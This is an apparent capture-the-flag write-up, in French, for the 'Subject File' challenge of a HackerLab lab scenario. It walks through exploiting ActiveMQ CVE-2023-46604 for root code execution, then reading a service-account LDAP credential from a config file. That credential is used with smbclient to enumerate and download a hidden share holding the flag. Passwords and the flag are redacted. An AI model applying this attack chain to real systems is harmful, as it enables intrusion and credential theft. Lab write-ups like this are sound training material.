---
title: "Operation Tervalis · Subject File"
platform: "HackerLab Benin 2026 (H4ckd4ne)"
category: "web-ad"
difficulty: "—"
points: 100
os: "—"
date: 2026-11-20
author: "Unpasswd"
author_github: "H4ckd4ne"
source: "https://github.com/H4ckd4ne/hackerlab2026-writeups/blob/main/operation-tervalis/subject-file/writeup-subject-file.md"
license: "CC BY-SA 4.0"
status: published
---

# Subject File (08) — Write-up

## Objectif

Retrouver les dossiers relatifs au sujet **SUBJ-7742** (Tims Avald) stockés dans les systèmes internes du FBI Valdoria, et soumettre le flag de la carte `Subject File` (100 pts).

## État initial

L'ancienne instance Tervalis était bloquée par son AD Samba. La nouvelle instance fournie pour la phase II utilise le sous-réseau **172.28.28.0/24** :

- portail FBI Valdoria : `172.28.28.2:8080`
- ActiveMQ OpenWire : `172.28.28.2:61616`
- `dc01` : `172.28.28.3` (LDAP/SMB)
- `fs01` : `172.28.28.5` (SMB)

## Reconnaissance et accès initial

### RCE ActiveMQ

Le portail expose ActiveMQ sur `61616`. L'exploit OpenWire (CVE-2023-46604) est utilisé avec un serveur HTTP local qui sert un XML Spring `ProcessBuilder` et récupère la sortie par POST.

```bash
WAIT=60 python3 /tmp/run_rce28.py 'hostname -I'
# 172.28.28.2 10.96.20.3
```

Le shell est **root** dans le conteneur du portail. L'interface `10.96.20.3` donne accès au réseau interne Docker.

### Fichiers de l'application

Le code du portail est dans `/app` (`server.py`, `app.js`, `index.html`) et la base dans `/data/portal.db` (cas, événements, messages). Le fichier de configuration ActiveMQ contient le compte de service :

```text
/opt/activemq/conf/ad-connector.properties
ldap.host=dc01.valdoria.fbi.lab
ldap.port=389
ldap.bind.user=svc_web
ldap.bind.password=<redacted>
ldap.base.dn=DC=valdoria,DC=fbi,DC=lab
```

> Le mot de passe du compte `svc_web` est volontairement omis de ce document.

### DNS et réseau interne

Depuis le conteneur :

```bash
getent hosts dc01 fs01
# 172.28.28.3 dc01
# 172.28.28.5 fs01
```

Le scan du réseau 10.96.20.0/24 montre le DC (`10.96.20.2` : 88/139/389/445/636), le portail (`10.96.20.3` : 8080), et des hôtes SMB (`10.96.20.4`, `10.96.20.5`).

## Accès au partage caché Recon-Data

Le compte `svc_web` permet d'énumérer les partages du DC :

```bash
smbclient -L //172.28.28.3 -U 'VALDORIA/svc_web%<redacted>' -m SMB3
# sysvol, netlogon, IT-Share, IPC$
```

`IT-Share` est refusé (`NT_STATUS_ACCESS_DENIED`). Le hint « répertoire caché **Recon-Data** » indique un partage non listé. Le partage `Recon-Data` est accessible directement :

```bash
smbclient //172.28.28.3/Recon-Data -U 'VALDORIA/svc_web%<redacted>' -m SMB3 -c 'ls'
```

Contenu :

```text
ad_security_audit.txt
tims_profile.txt
tims_profile.pdf
tims_surveillance_report.txt
tims_surveillance_report.pdf
```

Téléchargement :

```bash
smbclient //172.28.28.3/Recon-Data -U 'VALDORIA/svc_web%<redacted>' -m SMB3 \
  -c 'prompt OFF; recurse ON; mget *'
```

## Identification du sujet et du flag

`tims_profile.txt` est le dossier du sujet :

```text
SUBJECT IDENTIFICATION
Full Name: Tims Avald
Subject ID: SUBJ-7742
Alias: KAPPA
...
```

Le fichier contient le flag de la carte `Subject File` (valeur soumise, volontairement omise ici). `tims_surveillance_report.txt` documente la filature et l'opération TERVALIS ; `ad_security_audit.txt` contient l'audit des comptes de service et servira pour la phase suivante (`Sealed Order`).

## Pistes qui ont échoué

- `IT-Share` sur le DC : accessible en énumération mais refusé au montage pour `svc_web`.
- `fs01` (`172.28.28.5`) : authentification SMB refusée avec `svc_web`.
- Ancienne instance Tervalis : AD Samba non fonctionnel, partages inaccessibles.
- Anciens flags « Subject File » essayés lors des sessions précédentes : décoys, refusés par la plateforme.

## Validation

1. RCE ActiveMQ sur `172.28.28.2:61616` et `hostname -I`.
2. Lecture de `/opt/activemq/conf/ad-connector.properties` (compte `svc_web`).
3. `smbclient //172.28.28.3/Recon-Data` avec `svc_web`.
4. Lecture de `tims_profile.txt` : sujet `SUBJ-7742` et flag.
5. Soumission du flag à `Subject File` : la plateforme répond `Correct`.

## Nettoyage

- Le runner ActiveMQ et le serveur HTTP local sont arrêtés.
- Le mot de passe `svc_web` et le flag ne sont pas écrits dans ce document.
